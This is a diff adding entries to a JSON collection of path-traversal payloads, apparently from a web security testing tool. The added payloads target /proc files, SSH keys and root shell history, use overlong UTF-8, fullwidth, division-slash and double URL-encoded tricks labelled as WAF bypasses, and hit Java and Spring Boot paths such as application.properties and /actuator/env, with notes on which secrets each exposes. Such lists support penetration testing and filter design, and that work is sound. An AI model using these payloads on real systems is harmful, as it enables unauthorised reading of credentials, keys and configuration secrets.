@@ -15,7 +15,10 @@
         {"payload": "../../../var/log/apache2/access.log", "description": "Apache access log (log poisoning)", "waf_bypass": false},
         {"payload": "../../../var/log/nginx/access.log", "description": "Nginx access log (log poisoning)", "waf_bypass": false},
         {"payload": "../../../home/user/.ssh/id_rsa", "description": "SSH private key retrieval", "waf_bypass": false},
-        {"payload": "../../../root/.bash_history", "description": "Root bash history", "waf_bypass": false}
+        {"payload": "../../../root/.bash_history", "description": "Root bash history", "waf_bypass": false},
+        {"payload": "../../../proc/net/fib_trie", "description": "Kernel routing table — reveals internal network ranges and interfaces", "waf_bypass": false},
+        {"payload": "../../../proc/self/maps", "description": "Process memory map — reveals loaded libraries, ASLR base addresses", "waf_bypass": false},
+        {"payload": "../../../proc/self/status", "description": "Process status — reveals UID, GID, capabilities of the running process", "waf_bypass": false}
       ]
     },
     "windows": {
@@ -57,6 +60,26 @@
         {"payload": "../../../etc/passwd\u0000.png", "description": "Unicode null byte with .png extension", "waf_bypass": true},
         {"payload": "../../../etc/passwd%00/etc/passwd", "description": "Null byte mid-path injection", "waf_bypass": true},
         {"payload": "..%00/..%00/..%00/etc/passwd", "description": "Null byte in traversal segments", "waf_bypass": true}
+      ]
+    },
+    "unicode_overlong": {
+      "description": "Unicode and overlong encoding payloads to bypass path traversal filters via character encoding tricks",
+      "payloads": [
+        {"payload": "..%c0%af..%c0%af..%c0%afetc/passwd", "description": "Overlong UTF-8 encoding of / (U+002F) — 2-byte overlong form bypasses ASCII slash filters", "waf_bypass": true},
+        {"payload": "..%c1%9c..%c1%9c..%c1%9cwindows/win.ini", "description": "Overlong UTF-8 encoding of \\ (U+005C) — bypasses backslash filters on Windows", "waf_bypass": true},
+        {"payload": "..%ef%bc%8f..%ef%bc%8fetc/passwd", "description": "Fullwidth solidus (U+FF0F) — some normalizers convert fullwidth / to ASCII /", "waf_bypass": true},
+        {"payload": "..%e2%88%95..%e2%88%95etc/passwd", "description": "Division slash (U+2215) — mathematical operator that may normalize to path separator", "waf_bypass": true},
+        {"payload": "..%252f..%252f..%252fetc%252fpasswd", "description": "Double URL-encoded slash — decoded twice by proxy+app to produce ../../../", "waf_bypass": true},
+        {"payload": "%u002e%u002e%u002f%u002e%u002e%u002fetc%u002fpasswd", "description": "IIS %u encoding — Microsoft Unicode encoding variant for dots and slashes", "waf_bypass": true}
+      ]
+    },
+    "java_specific": {
+      "description": "Path traversal payloads targeting Java/JVM web applications and frameworks",
+      "payloads": [
+        {"payload": "/WEB-INF/web.xml", "description": "Java webapp deployment descriptor — reveals servlets, filters, security constraints, init params", "waf_bypass": false},
+        {"payload": "/META-INF/MANIFEST.MF", "description": "JAR manifest file — reveals library versions, build info, classpath", "waf_bypass": false},
+        {"payload": "/WEB-INF/classes/application.properties", "description": "Spring Boot config — may contain database credentials, API keys, secrets", "waf_bypass": false},
+        {"payload": "/actuator/env", "description": "Spring Boot Actuator environment — exposes all config properties including secrets (if actuator is exposed)", "waf_bypass": false}
       ]
     }
   }
